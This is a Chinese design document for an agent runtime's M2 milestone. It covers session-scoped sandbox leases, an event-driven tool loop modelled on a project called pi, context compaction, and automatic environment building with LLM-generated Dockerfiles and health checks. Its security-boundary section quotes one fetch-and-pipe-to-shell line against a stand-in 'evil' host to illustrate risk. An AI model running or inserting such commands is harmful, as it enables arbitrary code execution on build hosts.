# Agent 运行时技术方案（M2：环境与上下文）

> 版本 v1.2 · 2026-09-13
> **v1.1 改了什么**：把「**会话是长期实体，Run 只是一次执行**」写实。v1 草案把会话与 Run 绑死
> （`run_sessions` 一张表同时当两者用），那等于用户回第二句话时开了一个新会话、历史断掉。
> **v1.2 改了什么**：沙箱从"一次执行一个"改成"**会话的工作区租约**"——按需建、热着复用、
> 空闲回收、回收前落地。v1.1 的"每句话建一个沙箱"在讨论需求时会白白建出几十个容器
> （见 §A.1 的对照表）。同时把**向量检索移出 M2**（没有需求驱动），Phase 13 个、43–58 人日。
> 目标：**任意仓库能自动跑起来**（Environment），**agent 真正"懂"这个仓库**（Context），
> 并且把 M0 那套"能跑通闭环"的 agent 代码，换成与兄弟项目 **pi**（`/Users/reuben/Documents/pi`）同构的运行时。
> 一句话：**环境是编译出来的，上下文也是编译出来的。**
> 不作目标：通用 agent 框架、通用 RAG、多 agent 花式协作。
>
> **本文回答"为什么这样设计"。** 具体怎么落地——Phase 拆分、每个 Phase 的实现步骤 / 技术边界 /
> 测试要点 / 验收标准——见 [`agent-runtime-spec.md`](agent-runtime-spec.md)。
> 两份冲突时**以本文为准**；spec 附录 A 列出的偏差是**有意的**（每条都写了理由），改回去之前先读那条。

---

## 0. 这份文档站在哪

### 0.1 M0 已经结束了（2026-09-13）

对照 README §5 的 M0 清单，沙箱侧与 agent 侧**全部落地**，本地 382 个单元测试 + Linux 上的隔离红线 CI 全绿：

| M0 交付 | 落点 |
|---|---|
| exec 内核 + 文件/路径 API + diff/archive | `packages/sandbox-agent/`（9 个端点，argv 无隐式 shell，SSE 重连重放） |
| 沙箱镜像 + 加固 + internal 网络 + egress-proxy | `images/sandbox/`、`packages/control-plane/src/provider/`、`deploy/egress-proxy/` |
| CP 持久层（状态机唯一写入口 + 对账 + 看门狗） | `packages/control-plane/src/{db,manager}/` |
| 仓库进出（clone → 灌入 → diff → apply → push） | `packages/control-plane/src/repo/` |
| 归档落对象存储 | `packages/control-plane/src/artifacts/` |
| Agent 循环 + 4 个工具（bash/read/write/list） | `packages/control-plane/src/agent/` |
| GitHub App + draft PR（真 GitHub 上端到端跑通） | `packages/control-plane/src/repo/pr.ts` + `agent/run.ts` |
| 观察窗（SSE 实时 transcript + 零构建前端） | `packages/control-plane/src/web/` + `packages/web/` |

一句话：**"给一个 issue、产出一个 patch（或一条 PR）"这条闭环已经成立。** 剩下的问题不是"能不能跑"，而是：

1. **只能服务少数仓库**——环境要人肉准备，装不上依赖就卡死；
2. **agent 对仓库没有全局感**——只能靠一条条 `ls`/`read` 摸黑，长任务必然迷路；
3. **上下文没有预算概念**——一个 `cat` 大文件就能把窗口顶爆，M0 的策略只是"丢掉最旧的 tool_result 内容"；
4. **agent 代码是一坨自成一体的实现**——循环、工具、提示词耦合在 CP 里，和 pi 的成熟契约不通。

M2 就是解决这四件事。

### 0.2 为什么不先做 M1

README 里 M1 的清单，**有一半在 M0 已经顺手做掉了**：

| M1 原清单项 | 现状 |
|---|---|
| 状态机 + 持久化 + 崩溃恢复 + 孤儿容器对账 | ✅ M0 Phase 8 已完成（真容器丢失 / 孤儿容器 / kill -9 三条对账场景进集成测试） |
| GitHub App 集成（安装授权 + PR 创建） | ✅ M0 Phase 12 已完成（真 GitHub 端到端） |
| 产出 PR 而非 patch | ✅ M0 Phase 12 已完成 |
| gVisor（接第一个外部用户前的**硬门槛**） | ❌ 未做 |
| 远程沙箱（K8s + NetworkPolicy），CP 不再持有 docker socket | ❌ 未做 |
| 基础权限（仓库/分支范围） | ❌ 未做（当前是单租户、本地 docker socket、无鉴权） |

所以 **M1 真正剩下的只有"隔离强度"和"远程化"两件事**，而这两件事的触发条件是**接外部用户 / 多节点**，不是"让 agent 更聪明"。

**结论：M2 可以在 M1 前面做，但有一个前提必须写死在排期里——**

> **在接入第一个不受信任的用户代码之前，gVisor 是硬门槛，不是优化项。**
> M2 的所有工作都建立在"单租户 + 本地 Docker + 受信任仓库"这个前提上。
> 这个前提一旦被打破（开源仓库、外部用户、公开 demo），先做 M1 的隔离升级，再继续 M2 的任何一项。

这不是"以后再补"的免责声明，而是**排期约束**（与 `sandbox.md` §F.0 同一句话）。M2 与 M1 的正确关系：

```
        M2（本文）                         M1（真正的剩余部分）
  环境 + 上下文 + 运行时          gVisor → K8s 远程沙箱 → 权限模型
  让 agent 更聪明                 让平台能接不信任的代码
        │                                   │
        └────────── 两者互不依赖 ────────────┘
        （M2 换不掉 SandboxProvider 接口；M1 换不掉 ContextCompiler 的输入输出）
```

### 0.3 M2 的边界（这一节是排期的锚）

**做：**

| # | 子系统 | 一句话 |
|---|---|---|
| 1 | **Agent Runtime（对齐 pi）** | 把循环 / 会话 / 上下文 / 工具拆成独立包，契约与 pi 同构 |
| 2 | **多轮会话** | 会话是长期实体：多轮对话、按需创建/热着复用的沙箱、压缩、续轮（见 §A.1） |
| 3 | **Environment（环境构建）** | 任意仓库自动得到可用环境：三级推断 + 自愈 + 缓存 + 健康检查 |
| 4 | **仓库索引与 Repo Map** | 让 agent 开局就有"这个仓库长什么样"的骨架 |
| 5 | **ContextCompiler** | 每次模型调用前编译上下文：分区、预算、压缩、可回放 |
| 6 | **Tool Registry / Skill / MCP** | 工具单一事实来源；技能按需加载；MCP 作为注册源之一 |

**不做**（触发条件见 §H）：向量检索的默认开启、多 agent 协作、**同一个** Run 崩了原地续跑（M3）、
空闲时挂沙箱等用户（M3）、会话分叉 / 并行试两种方案（M3）、审批流（M3）、Project Memory（M3）、
成本看板（M3）、gVisor/远程沙箱（M1）。

---

## A. 目标架构

```
┌─────────────────────────────────────────────────────────────────────────┐
│ Control Plane（决策与编排）                                              │
│                                                                          │
│  ┌────────────────────┐   ┌──────────────────────────────────────────┐  │
│  │ run 编排            │   │ packages/agent-runtime（M2 新增）          │  │
│  │ repo/ pr/ manager/  │──►│  loop.ts      循环（对齐 pi）             │  │
│  │ sessions/ runs/     │   │  session/     会话存储（entries 树）       │  │
│  │                     │   │  compaction/  上下文压缩（对齐 pi）        │  │
│  │                     │   │  context/     ContextCompiler            │  │
│  │                     │   │  tools/       内置工具（沙箱 port 注入）   │  │
│  │                     │   │  registry/    工具注册表（builtin/skill/mcp）│
│  │                     │   │  skills/      SKILL.md 发现与注入         │  │
│  │                     │   │  mcp/         MCP 客户端（CP 侧）          │  │
│  │                     │   │  prompt/      系统提示词组装              │  │
│  └────────────────────┘   └───────────────┬──────────────────────────┘  │
│                                            │                             │
│  ┌────────────────────┐   ┌───────────────▼──────────────────────────┐  │
│  │ environment/       │   │ index/（仓库索引 + Repo Map，M2 新增）     │  │
│  │ 三级推断 + 自愈     │   │  tree-sitter 符号 + PageRank 骨架          │  │
│  │ 缓存 + 版本 + 健康  │   └──────────────────────────────────────────┘  │
│  └─────────┬──────────┘                                                 │
│            │ docker build（宿主机）                                      │
│   ┌────────▼─────────┐        ┌──────────────────────────────────────┐  │
│   │ Postgres          │        │ Object Store（构建日志 / 请求全文 /   │  │
│   │ entries/usage/    │        │ 索引产物 / 归档）                     │  │
│   │ environments/...  │        └──────────────────────────────────────┘  │
│   └───────────────────┘                                                 │
└───────────┬─────────────────────────────────────────────────────────────┘
            │ 9 个端点（不变）
┌───────────▼─────────────────────────────────────────────────────────────┐
│ Sandbox（每个活跃会话一个；按需创建 · 热着复用 · 空闲回收）              │
│ sandbox-agent :8080 · /workspace(volume) · 只读根 · 零凭据 · 出网只开依赖源│
└─────────────────────────────────────────────────────────────────────────┘
```

**三条边界一个字都没变，M2 全部在 Control Plane 内部完成：**

1. Agent 循环仍然**只在 CP**（凭据、可迭代资产、可回放、零延迟代价，四条理由见 `sandbox.md` §A）；
2. 沙箱仍然**只执行不决策**，仍然零凭据、仍然只有依赖源可出网；
3. `SandboxProvider` 接口仍然是 3 个方法。

### A.1 会话 / 一次执行 / 沙箱：谁活多久、谁什么时候出现

先说最容易设计错的地方：**不是"用户一句话 = 一个沙箱"**。

用户在讨论需求时可能来回二十句，这二十句里一行代码都不用跑——**一个容器都不该建**。
沙箱是**会话的工作区**，不是某句话的附属品：

```
会话 Session（长期；存在 Postgres 里）
  = 一个仓库 + 一条对话历史（entries 只追加）+ 已经压过的摘要
  · 活多久：由用户决定（几天、几周都可以）
  │
  │  用户发一句话 → 跑一次执行（Run）
  ▼
Run（一次执行 = 处理用户这一句话）
  · 讨论型：模型只回文字 → **不需要沙箱**
  · 干活型：模型要用工具读/改/跑命令 → 需要一个沙箱（**用到才建**）
  · 一次执行里可以中途插话（steering）：消息注入当前 Run，不打断执行
  · 这一句说完就结束；`waiting_for_input` 不是 M2 的状态
  │
  ▼
沙箱 = 会话的"工作区租约"（会话级，不是 Run 级）
  · 按需创建：第一次真的要碰代码时才建
  · 热着复用：会话还活跃时，后面几十句都用这一个
  · 空闲回收：超过 TTL 没人说话 → 改动落地 + 销毁；下次要用再建
```

**一个会话到底建几个容器**（这张表是这一节的全部意义）：

| 场景 | 建几个容器 |
|---|---|
| 20 句讨论需求 / 让 agent 讲代码逻辑 / 问"这块啥意思" | **0 个**（除非模型主动去读代码，那才建第 1 个） |
| "开始改吧" → 改 → 看 diff → 再改 → 跑测试（十几句） | **1 个**（第 1 次工具调用时建，后面全部复用） |
| 闲置 30 分钟后再回来 | 1 个新的（旧的已回收；工作区从推上去的分支恢复） |
| 同一个会话并行来两个请求 | **不允许**：一个会话同时只有一次执行在跑（M2 直接拒；排队是 M3） |

**改动什么时候离开沙箱**（"热着复用"必然带来的问题）：

- 沙箱热着时，改动只在沙箱的工作区里——这是它的价值：不用每句话都推来拉去；
- 三种时刻必须让改动落地（取 diff → CP apply → push 到 `reuben-cloud/<task>` 分支）：
  ① 用户要求出 PR；② 沙箱被回收之前（空闲超时 / 会话结束 / 手动关）；③ 用户明确说"这轮到这"；
- 如果沙箱在落地之前**硬崩**（容器丢失），这段时间的改动会丢。这是有意识的取舍：
  用"极少数情况下丢几十分钟的改动"换"每句话不推送、不重复 clone"。**它必须有界**——
  正常路径（回收 / 出 PR / 超时）全都会落地，只有硬崩溃才丢，而且 `ERROR(container_lost)`
  会明确告诉用户"丢的是哪一段"。

**一个完整例子**（讨论 → 干活 → 闲置 → 回来）：

```
第 1–20 句  用户和 agent 讨论需求、看代码讲逻辑、改方案   → 0 个容器
            （模型要用 read/grep 看代码时才建第 1 个）
第 21 句    "开始改吧"                                    → 复用那个容器（或此时才建）
第 22–30 句 改 → 看 diff → 再改 → 跑测试                    → 还是那一个
第 31 句    用户没再说话（超过空闲 TTL）                     → 取 diff → push 到任务分支 → 销毁
第二天      用户"再给我加个日志"                            → 新建 1 个沙箱，从任务分支拉 → 继续
```

**三条由此确定的规则**：

1. **entries 挂会话，不挂 Run**。会话是长期实体；Run 只是"哪一句话在处理"。
2. **沙箱是会话的资源，不是 Run 的资源**。`sessions` 上记着当前沙箱与最后活跃时间；
   已有的 `sandboxes` 表**加一列 `session_id`**（M0 的三张表结构不动）。
3. **"Run 内部的 turn" 与 "一次执行" 是两层**：`tool_invocations.turn` 是模型往返序号（一次执行里
   可能有几十个 turn）；`runs` 表一行对应一句用户消息。别把这两个词混着用。

**这不影响隔离与凭据红线**：会话历史在 CP 的 Postgres 里，沙箱依然零凭据、依然只有依赖源可出网。
热着复用的代价是"容器占着内存更久"，所以**空闲 TTL 是硬配置**（默认 30 分钟；上限 2 小时），
到点一定回收。

---

## B. 参考实现：pi

> **约束来源（用户明确要求）**：本项目的 agent 相关部分——循环、上下文管理、工具处理——**完全参考
> 同一个父目录下的 pi 项目**（`/Users/reuben/Documents/pi`）。
>
> **怎么"参考"**：参考的是**契约与取舍**，不是照抄代码规模。pi 是一个本地 TUI coding agent，
> 它的 harness 里有一大半（lanes / forks / navigation / inbox / RPC / 多 owner）是为交互式产品服务的，
> 我们的场景是"无人监督的异步 Run"。所以本文分两栏写：**对齐什么**（B.1–B.6）与
> **不搬什么**（B.7）。每一条都给了理由，避免"参考"变成"抄了一半然后两边都讲不通"。

### B.1 三层数据模型：entries / 值 / 用量

pi 的存储模型（`packages/agent/docs/harness.md` §0.3）只有三种持久形态：

```
entries       会话树——一次性写入、只追加（消息、压缩、分支摘要、自定义）
values/lists  当前可变状态——可替换的值 + 只追加的列表
usage ledger  成本账本——只追加（每次模型调用一行）
```

四条规则：**每个载荷必须落在这三者之一**；entry/用量写入与值写入在**同一个事务**里全有或全无；
每次持久状态转换后写入**完整的当前状态**（不依赖前一版）；外部效果分**意图 → 执行 → 结算**两次提交。

**我们要的部分**：`entries` + `usage ledger` + "意图/结算"这三个（M2 有直接消费者）；
`values/lists` 与完整的 operation 状态机**推迟到 M3**（它们的消费者是 lanes/forks/inbox，我们没有）。

**对齐后的收益**（不是"学 pi"本身，是三条实际的好处）：

1. **压缩不丢历史**：压缩写一条 `CompactionEntry`，改变的是"送进模型的内容"，不是存储内容。
   任何时候都能回答"模型当时看到的是什么"（§E）。
2. **崩溃后不留半截**：一次工具调用先落 intent（含参数与重放策略），效果完成再落 settlement。
   CP 崩在中间时，DB 里能明确看到"哪个调用在飞"——M3 的恢复因此是**读表**，不是重写（§G.3）。
3. **成本可归因**：每次模型调用（含压缩摘要、环境自愈）都进账本，M3 的成本看板与配额直接读它。

### B.2 循环契约：钩子化的 tool-use 循环

pi 的循环（`packages/agent/src/agent-loop.ts`）有几个**反直觉但正确**的设计，我们逐条对齐：

| pi 的设计 | 为什么 | 我们的落地 |
|---|---|---|
| 循环是**事件流**（`agent_start` / `turn_start` / `message_start|update|end` / `tool_execution_*` / `turn_end` / `agent_end`），返回值是最终 messages | UI、transcript、回放、测试全都从**同一个事件流**派生，不存在"第二套真相" | §B.4：M0 的 `RunEvent` 合并进这个事件协议 |
| 双层循环：内层处理 tool calls 与 steering，外层处理 follow-up | "用户中途插话"与"agent 收工后又来了新消息"是两件事，共用一个 `while` 会互相干扰 | 同一结构；steering 由 CP 的 `steer()` 灌入 |
| 循环**自己不管预算**：没有轮数/墙钟上限，只有 `shouldStopAfterTurn` 钩子 | 别人（集群调度、交互式用户）的上限诉求完全不同；上限属于宿主 | 我们的 40 轮 / 30 分钟 / 300k 输出 token 从 `loop.ts` 常量搬进 `shouldStopAfterTurn`（默认策略仍是这三个数） |
| `prepareNextTurn` 钩子在**每轮结束、下一轮开始前**跑 | 压缩、换模型、重编译上下文都在这一个时机发生；放进循环内部就要改循环 | 压缩挂在这里（§E.4），这正是 pi 的挂法 |
| `transformContext(messages)`：送模型前做一次整体变换 | 上下文编译（预算、检索注入、外置）不该污染循环 | ContextCompiler 就是我们的 `transformContext` |
| `convertToLlm(messages)`：**只在模型边界**做一次富类型 → 协议消息的转换 | `AgentMessage` 是应用层类型（可以有 `bashExecution`、`custom`、`compactionSummary`），协议消息是窄的；早转换会让工具与 UI 都被协议限制 | 我们已有类似分层（`ContentBlock`），M2 把它显式化成这一对函数 |
| 工具失败是**结果**（`isError: true`），不是异常；`tool_execution_end` 一定发 | 模型必须看到失败并自己改；异常会让整轮崩掉，前面的输出白烧 | 与 M0 一致，继续保持 |
| 多条 tool call 的结果放在**同一条消息**里、按**源码顺序**返回；执行可以并行 | 并行是性能，顺序是协议要求；乱序会让"tool_use 与 tool_result 配对"失效 | M0 已做（`Promise.all` + 顺序拼装），M2 加 `executionMode`（bash/edit 串行，read/grep 并行） |
| 响应被 `length` 截断时，**一个工具都不执行**，全部回失败让模型重发 | 半截 JSON 能被"抢救解析"成合法但内容残缺的参数——执行它比不执行更危险 | 对齐（M0 缺这一条） |

### B.3 工具契约：`AgentTool`

```ts
// pi: packages/agent/src/types.ts —— 我们按同一形状实现
interface AgentTool<TParams, TDetails> {
  name: string
  label: string
  description: string                 // 直接影响模型调用准确率，值得反复打磨
  parameters: TSchema                 // TypeBox → JSON Schema 给模型 + 运行时校验
  execute(toolCallId, params, signal?, onUpdate?): Promise<AgentToolResult<TDetails>>
  prepareArguments?(args): TParams    // 兼容不同 provider 的参数怪癖（可选）
  replay?: "never" | "safe"           // 崩溃后允许不允许重放（默认 never）
  executionMode?: "sequential" | "parallel"
}
interface AgentToolResult<TDetails> {
  content: (TextContent | ImageContent)[]   // 进模型的部分
  details: TDetails                          // 给 UI / 日志 / 恢复用，不进模型
  usage?: Usage
  terminate?: boolean                        // 全部工具都 terminate 才提前收工
  addedToolNames?: string[]                  // 这个结果让哪些工具从此可用（技能/MCP 懒加载）
}
```

**这套契约最值钱的两条**：

1. **`content` 与 `details` 分开**。给模型看的（截断后的文本）和给人看/给恢复用的（结构化事实：
   退出码、日志路径、截断信息、改动行数）是不同的东西。M0 已经这么干了，M2 只是把它变成契约。
2. **`execute` 的第三个参数是 `AbortSignal`，第四个是 `onUpdate`**。长命令（`npm test` 跑 5 分钟）
   必须能流式把中间输出推出去（观察窗要用），也必须能被取消。这两个口子现在就有，但没有形成契约。

**参数校验用 TypeBox**（pi 的选择，`typebox@1.3.27`）：一份声明同时给出 TS 静态类型、JSON Schema
（发给模型的 `parameters`）和运行时校验。M0 是手写 JSON Schema + 手写校验，两处会漂；
README §3.4 里写的 Zod 是当时的口误，M2 一并改成 TypeBox（见 §L 的文档修正）。

### B.4 富消息（AgentMessage）与协议消息分开

```
工具/技能/压缩产出的东西            送模型前的最终形态
┌──────────────────────────┐        ┌───────────────────────┐
│ AgentMessage             │        │ provider Message      │
│  - user                  │        │  - user / assistant    │
│  - assistant(blocks)     │  ────► │  - tool_use/tool_result│
│  - toolResult            │ convertToLlm                │
│  - compactionSummary     │        └───────────────────────┘
│  - custom / skillNote    │
│  - bashExecution(M3)     │
└──────────────────────────┘
```

**为什么要多这一层**：压缩摘要、技能注入、审批记录这些东西**要进存储、要在 UI 上显示，但不该
伪装成"用户说的话"**。pi 把 `compactionSummary` 在转换时渲染成一条带特殊前缀的消息（模型知道
"这是摘要，不是新指令"）。如果我们把摘要直接拼成 user 文本，模型会把它当新任务来理解——这是
压缩后 agent 跑偏的常见原因，而它在代码里只表现为"少了一层类型"。

### B.5 事件协议是唯一真相

pi 的 `AgentEvent` 是循环对外的**唯一**输出。我们的 M0 有两套：

- `agent/events.ts` 的 `RunEvent`（给观察窗，SSE）；
- `agent/transcript.ts` 的 JSONL（给回放，一轮一条记录）。

两套必然漂（M0 已经出现过"加了一类事件、前端静默丢掉"的问题，所以 Phase 13 才写了"每个
RunEvent.type 都必须在前端有分支"的单测——那是在给两套真相打补丁）。

**M2 只留一套**：`AgentEvent` 是唯一事件源；SSE 是它的一个订阅者；entries 是它的持久化投影；
回放读 entries + `model_requests`（§G）。`RunEvent` 这个名字保留给"Run 生命周期"（`run_start`/
`run_end`/`run_error`），但工具、消息、命令输出全部走 `AgentEvent`。

### B.6 对齐清单（M0 现状 → M2 目标）

| # | M0 现状 | M2 目标 | 理由 |
|---|---|---|---|
| 1 | 循环、工具、提示词全在 `control-plane/src/agent/`，与 pg/octokit/s3 同包 | 独立 workspace 包 `packages/agent-runtime/` | 循环与工具的单测不该拖 CP 的重依赖；与 pi 的 `packages/agent` + `packages/coding-agent` 同构 |
| 2 | 工具直接吃 `SandboxManager`（结构化窄接口，已经不错） | 保留 port，但改成 pi 的 `BashOperations` / `ReadOperations` 形状（一个工具一套 operations） | 换执行后端（远程沙箱 M1、本地裸跑测试）时不动工具逻辑 |
| 3 | 手写 JSON Schema + 手写校验 | TypeBox | 一份声明三个用途 |
| 4 | 上下文策略 = 超 600k 字符丢旧 tool_result | compaction（阈值切点、结构化摘要、split turn） | 丢旧结果是"慢慢烂"，压缩是"有损但可控" |
| 5 | transcript = JSONL 逐轮追加 | entries 表（append-only）+ `model_requests`（可回放全文） | 崩溃安全 + 压缩不需要重写文件 |
| 6 | 没有 rewind/续跑基础 | 工具调用 intent/settlement | M3 恢复的前置（M2 只记录，不恢复） |
| 7 | 4 个工具（bash/read/write/list） | 7 个（+ edit/grep/find），行为对齐 pi | edit 精确替换比 write 整文件回写省 token 且更安全；grep/find 让 agent 不用自己拼命令 |
| 8 | 系统提示词写死一段话 | 分区组装：系统 + 工具 + 技能 + Repo Map + 任务 | 每块有自己的预算、可单独迭代、可回放 |
| 9 | 没有技能/MCP 概念 | Skill（标准格式 + 按需加载）与 MCP（注册源之一） | 能力扩展不该改 runtime 代码 |
| 10 | 两个事件流（RunEvent + JSONL） | 一个 `AgentEvent` | 见 §B.5 |

### B.7 明确**不搬**的 pi 能力（及触发条件）

| pi 的能力 | 为什么 M2 不搬 | 什么时候才需要 |
|---|---|---|
| 完整的 operation 状态机（`accept` / `drive` / `requestAbort` / `inspectExecution`、durable restart point、恢复规程） | 它解决的是"**同一个 Run** 被中断后原样续跑"（多入口调度 + 崩溃恢复）。M2 要的是"**会话**能续轮"——那就是 §A.1 的 `sessions` + `runs`，不需要每个操作都有一套可恢复状态 | M3「检查点恢复 / 云端多进程执行」——那时照它的形状做，而不是现在先建空壳 |
| Branch / Lane / 会话树分叉 / navigation | **多轮对话不需要分叉**：一条对话就是一条直线，第 N 轮追加在第 N-1 轮后面（§A.1 已经做掉这件事）。被推迟的是"**从某一点并行试两种方案**"——那对分支/导航/结果合并的需求完全不同 | M3 的并行 Run（README §5 已有此条） |
| 多 owner / RPC / inbox / 服务器托管 | 我们没有远端 session 服务 | 明确不做（非目标） |
| JSONL / SQLite / Memory 三后端 | pi 要同时支持本地文件与嵌入式库；我们只有 Postgres + 测试用的内存实现 | 保持两个实现：Postgres（生产）、memory（单测） |
| token 级 `Extension` 插件系统（`extensions/**`） | 它解决的是"第三方在不改核心的前提下加工具/命令/UI"；我们的扩展点是 Skill 与 MCP，两者都有标准协议 | 出现"用户要写代码扩展 runtime"的诉求时 |
| sub-agent / plan mode / to-do / 后台 bash | pi 自己也在 README 里写明"不做，用扩展或容器补" | 分别触发各自的需求（子 agent → 探索型任务的上下文隔离，README §3.3 已经埋了这条） |

---

## C. Environment（环境构建）

### C.1 核心洞察

> **不要把"镜像"当静态产物，要当一条构建管线。**

"提前弄好基础镜像"这句话听着简单，实际是个独立产品：真实仓库要语言工具链、包管理器、
Postgres、Redis，集成测试要 docker-in-docker，e2e 要浏览器，拉依赖要出网。手工做镜像 =
只能服务三个仓库。

**M2 的验收口径要写死**：不是"支持 N 种语言"，而是**"给任意仓库，能在 10 分钟内得到一个
`ready` 或明确 `degraded/failed` 的环境，并给出原因"**。failed 也是一个合法结果——比"跑起来
才发现装不上依赖"好得多。

### C.2 三层结构

```
Layer 1  Base        我们维护的基础镜像矩阵（不是给用户配的）
                     node-dev / python-dev / go-dev / rust-dev / fullstack / ubuntu-dev
                     ↓ 每个都含：非 root uid 1000、sandbox-agent、git、常用工具
Layer 2  Project     从仓库自动推断 + 构建（可缓存、可版本化）
                     优先复用 devcontainer > Dockerfile > 信号推断 + LLM 生成
                     ↓
Layer 3  Session     会话期增量（装新依赖、seed 数据、起服务），可"固化"回 Layer 2
```

**Layer 1 要改的现状**：现在只有 `images/sandbox/Dockerfile` 一个镜像，它同时承担了三件事——
（a）语言运行时、（b）sandbox-agent 的运行环境、（c）加固的基准。M2 拆成：

```
images/base/Dockerfile.common          # 阶段：sandbox-agent + 工具链 + uid 1000 约定
images/base/Dockerfile.node-dev        # FROM common + node/npm/pnpm/yarn
images/base/Dockerfile.python-dev      # FROM common + python3/pip/uv/venv/build-essential
images/base/Dockerfile.go-dev          # FROM common + go + gopls
images/base/Dockerfile.rust-dev        # FROM common + rustup/cargo
images/base/Dockerfile.fullstack       # node + python + postgres-client + redis-tools
images/base/Dockerfile.ubuntu-dev      # 兜底：只有 git/curl/build-essential
```

**加固参数仍然只在 provider 侧传**（`sandbox.md` §F.1），镜像里一个字都不写——镜像可以被换掉，
provider 传的参数才是可信那一侧。这个原则不变。

### C.3 Layer 2 的三级推断

```
L1  存在 .devcontainer/devcontainer.json   →  直接复用（最优先，规范成熟）
L2  存在 Dockerfile / compose.yaml         →  复用 + 叠加"agent 必需组件"
L3  以上都没有                             →  信号 + LLM 生成 → 构建 → 失败自愈
```

**为什么 devcontainer 优先**：它是**仓库作者自己写的**运行环境定义，比任何推断都准，而且已经
包含"这个项目要怎么跑"的隐含知识（features、postCreateCommand、forwardPorts）。M2 只支持常用
子集：`image`、`build.dockerfile` + `build.context` + `build.args`、`features`（只认官方 registry
里的 common 类）、`containerEnv`、`postCreateCommand`、`mounts`（忽略，为了隔离）。**不支持的字段
要显式记录"已忽略"**，而不是静默丢弃——用户下次问"为什么我的 devcontainer 没生效"时，日志里要有答案。

**L2 的"叠加 agent 必需组件"清单**（少一条都会在运行时以怪现象暴露）：
`sandbox-agent` 运行时、`git`、`tar/gzip`、`curl`、`procps`、非 root uid 1000、
`HOME=/tmp/agent`、`PYTHONUNBUFFERED=1`、`LANG=C.UTF-8`。这与 `sandbox.md` 的 Phase 4 备注是同一批坑。

**L3 的信号来源**（按"信息密度"排序，不是按文件类型）：

| 信号 | 从哪读 | 推断出什么 |
|---|---|---|
| 锁文件 | `package-lock.json` / `pnpm-lock.yaml` / `yarn.lock` / `uv.lock` / `poetry.lock` / `Cargo.lock` / `go.sum` | 包管理器与版本（**锁文件比 `package.json` 权威**） |
| 运行时版本 | `.nvmrc` / `.tool-versions` / `mise.toml` / `engines` / `go.mod` 的 `go 1.x` / `pyproject.toml` 的 `requires-python` | 语言版本 |
| 构建入口 | `Makefile` 目标 / `package.json` 的 `scripts` / `justfile` | 构建与测试命令（后面的健康检查直接用） |
| CI 配置 | `.github/workflows/*.yml` 里的 `setup-*` 与 `run:` | 环境事实（CI 怎么跑，本地就该怎么跑） |
| 服务依赖 | `compose.yaml` 的 services | 需要 Postgres/Redis 等（→ `degraded` 的判据） |
| 文档 | README 里的 install/requirements 段落 | 兜底信号（最后才用） |
| 目录结构 | `src/`、`packages/`、`apps/` | monorepo 判定 |

**输出**：一个 `EnvironmentCandidate`（base image + Dockerfile 片段 + 包管理器 + 建议的
build/verify 命令 + degraded 风险清单）。

### C.4 LLM 生成 Dockerfile + 自愈循环

```
生成 Dockerfile（模型 + 信号）
  → docker build
  → 失败？把「构建日志尾部 + Dockerfile + 信号摘要 + 上一次的错误分类」喂回模型 → 重新生成
  → 最多 3 轮（第 3 轮还失败 → env 状态 failed，**保留全部日志给用户看**）
```

**三个防止"自愈变成无限烧钱"的约束**：

1. **轮数硬上限**（3 轮）与**单轮构建超时**（10 分钟）；
2. **每次自愈都进 usage ledger**（`kind = env_build`），成本可见；
3. **失败要分类**（未知基础镜像 / apt 包不存在 / npm 404 / 网络超时 / 构建上下文错误 /
   权限错误），分类进 prompt 比"把 2000 行日志原样喂回去"有效得多——模型看到
   `E: Unable to locate package libvips-dev` 和看到一坨日志的行为完全不同。

**生成的 Dockerfile 必须满足的硬约束**（写进生成 prompt，构建前也要校验）：

- 以某个 Layer 1 基础镜像为 `FROM`（不能从零开始，否则 uid/HOME/sandbox-agent 全丢）；
- **不写 `CMD`/`ENTRYPOINT`**（运行命令由沙箱镜像的 CMD 决定）；
- 不写 `USER root` 之后不切回来；不写 `COPY . .`（构建上下文只有推断用的元数据，没有仓库内容）；
- 不写 secret / token / 私有 registry 凭据（构建阶段的网络不受 egress-proxy 白名单约束，见 C.7）；
- 只装依赖，不跑测试（测试是健康检查的事）。

### C.5 构建缓存与版本化

```
cache_key = sha256(base_image + normalize(repo_signals) + builder_version + dockerfile_text)
```

- 命中 → 直接复用已有镜像 digest，"团队里第一个人构建，后面所有人秒开"；
- `builder_version` 进 key 的理由：改了生成 prompt / 改了 Layer 1 基础镜像 / 改了叠加组件清单，
  都必须让旧缓存失效——否则会出现"本地是好的、线上是旧的"这种最难查的问题；
- `repo_signals` 要**规范化**（排序的键、去掉注释与空行、不带时间戳），否则同一份信号两次算出
  不同的 key，缓存永远不会命中。

**版本化**：`environments` 表里 `(project_key, revision)` 单调递增，`revision` 的父指针指向上一版；
每次"重新构建"或"promote（会话级改动固化回项目级）"产生一个新 revision。回滚 = 把指针指回旧 revision
（旧镜像还在，因为按 digest 引用）。**保留策略**：最近 N=10 个 revision，更旧的镜像可清理，
但被任何 Run 引用过的 digest 不清理（`sandbox` 表里查得到）。

### C.6 健康检查（构建完必须跑）

构建成功 ≠ 环境可用。**必须**在**用这个镜像起的一次性沙箱里**跑 smoke test，把"环境能不能用"
变成显式状态：

| 状态 | 判据 | 例子 |
|---|---|---|
| `ready` | 依赖安装 + 构建命令成功 | `npm ci && npm run build` / `go build ./...` / `pytest --collect-only` |
| `degraded` | 构建成功，但部分能力不可用，**原因结构化** | compose 里的 Postgres 起不来 → "不能跑集成测试"；Playwright 浏览器缺失 → "不能跑 e2e" |
| `failed` | 依赖安装或构建失败 | `npm ci` 404 / `go build` 编译错误 / 超时 |

**degraded 是 M2 最有价值的一个状态**：它让 agent 知道"这个仓库的集成测试不用试了"，而不是
反复失败三次然后耗尽预算。构建日志与健康检查日志都落对象存储（`env_builds.log_key`）。

### C.7 构建在哪跑：一个必须写明白的安全边界

**环境构建在 CP 宿主机上跑 `docker build`，不在沙箱里。**

- 构建需要**完整的出网能力**（拉 apt/npm/pypi），而沙箱的网络被 egress-proxy 白名单锁死；
- 构建是在"沙箱之外"执行**不可信内容**（仓库里的 Dockerfile、LLM 生成的 Dockerfile 都是任意代码：
  `RUN curl evil.sh | sh` 在 build 阶段就会执行）；
- M2 的前提是**单租户 + 受信任仓库**，所以这个风险被接受，但必须写出来：

> **风险登记（M2 已知）**：`docker build` 在 CP 宿主机上执行不可信 Dockerfile。
> 缓解：只构建受信任仓库；构建容器不含任何 CP 凭据（构建进程的 env 里没有 GitHub token / 模型 key）；
> `--build-arg` 白名单；构建超时与并发上限（1）。
> **触发升级**：接入不受信任仓库前，把构建搬进一次性构建容器（`--network` 限制 + 用后即焚），
> 或搬到 K8s 的构建节点（M1 的顺带收益）。

